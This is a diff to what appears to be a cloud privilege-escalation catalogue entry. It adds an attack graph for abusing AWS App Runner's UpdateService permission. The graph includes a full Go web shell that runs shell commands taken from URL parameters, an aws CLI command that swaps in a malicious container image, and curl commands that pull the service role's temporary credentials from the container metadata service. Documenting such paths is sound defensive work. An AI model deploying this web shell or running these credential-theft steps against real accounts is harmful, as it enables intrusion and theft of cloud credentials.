@@ -116,3 +116,150 @@ permissions:
   required:
   - permission: apprunner:UpdateService
     resourceConstraints: Target App Runner service must be in the Resource section
+attackVisualization:
+  nodes:
+    - id: start
+      label: starting-principal
+      type: principal
+      description: |
+        The principal with apprunner:UpdateService permission. Can be an IAM user or role. This principal can modify existing App Runner services to change their container image source.
+
+    - id: target_service
+      label: App Runner Service
+      type: resource
+      description: |
+        An existing App Runner service with an IAM role attached. The service runs containerized applications and has access to temporary credentials via the container metadata service at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.
+
+    - id: service_role
+      label: service-role
+      type: resource
+      description: |
+        IAM role already attached to the App Runner service. The role trusts apprunner.amazonaws.com and was passed when the service was created. Credentials are available via the container metadata service.
+
+    - id: malicious_container
+      label: Deploy Malicious Container
+      type: action
+      color: '#99ccff'
+      description: |
+        Build and push a malicious container image (such as a web shell) to a container registry, then update the service to use this image. The malicious container executes with the service role's permissions and can query the container metadata service to retrieve temporary credentials.
+
+        The web shell accepts commands via URL parameters and executes them within the container context, allowing the attacker to run arbitrary code with the service role's credentials.
+
+    - id: exfiltrate_creds
+      label: Exfiltrate Credentials
+      type: action
+      color: '#99ccff'
+      description: |
+        Use the deployed web shell to query the container metadata service and retrieve the service role's temporary credentials. The credentials include AccessKeyId, SecretAccessKey, and SessionToken.
+
+        Command executed via web shell:
+        ```bash
+        curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+        ```
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The attacker successfully exfiltrated credentials and the service role has administrative permissions (AdministratorAccess or equivalent). The attacker now has full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Check for Additional Access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        The attacker successfully exfiltrated credentials and the service role has some elevated permissions (but not full admin). This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths.
+
+    - id: no_access
+      label: Minimal Additional Access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        The attacker successfully exfiltrated credentials, but the service role only has minimal permissions (like logs:PutLogEvents). Limited usefulness for privilege escalation.
+
+  edges:
+    - from: start
+      to: target_service
+      label: apprunner:UpdateService
+      description: |
+        Update the existing App Runner service to use a malicious container image. Unlike creating a new service, this doesn't require iam:PassRole since the role is already attached.
+
+        Command:
+        ```bash
+        aws apprunner update-service \
+          --service-arn SERVICE_ARN \
+          --source-configuration '{
+            "ImageRepository": {
+              "ImageIdentifier": "PUBLIC_ECR_URI:latest",
+              "ImageRepositoryType": "ECR_PUBLIC",
+              "ImageConfiguration": {
+                "Port": "8080"
+              }
+            }
+          }'
+        ```
+
+    - from: target_service
+      to: service_role
+      label: Service runs with role
+      description: |
+        The App Runner service runs the updated container with its attached IAM role. Credentials are automatically provided via the container metadata service.
+
+    - from: service_role
+      to: malicious_container
+      label: Deploy malicious image
+      description: |
+        Build a web shell container that accepts commands via URL parameters. Push the image to a container registry (ECR or public registry) and update the service configuration to use it.
+
+        Example web shell (Go):
+        ```go
+        package main
+        import (
+            "net/http"
+            "os/exec"
+        )
+        func handler(w http.ResponseWriter, r *http.Request) {
+            cmd := r.URL.Query().Get("cmd")
+            out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
+            w.Write(out)
+        }
+        func main() {
+            http.HandleFunc("/", handler)
+            http.ListenAndServe(":8080", nil)
+        }
+        ```
+
+    - from: malicious_container
+      to: exfiltrate_creds
+      label: Query metadata service
+      description: |
+        Access the deployed web shell via its public URL and execute a command to query the container metadata service. The service returns temporary credentials for the service role.
+
+        Command via web shell:
+        ```bash
+        curl "https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+        ```
+
+    - from: exfiltrate_creds
+      to: admin
+      label: If service role has admin permissions
+      branch: A
+      condition: admin
+      description: |
+        If the service role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by using the exfiltrated credentials.
+
+    - from: exfiltrate_creds
+      to: some_perms
+      label: If service role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the service role has some elevated permissions (data access, further escalation paths), the attacker can leverage the exfiltrated credentials for lateral movement or additional attacks.
+
+    - from: exfiltrate_creds
+      to: no_access
+      label: If service role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the service role only has minimal permissions, the exfiltrated credentials provide limited value for privilege escalation.
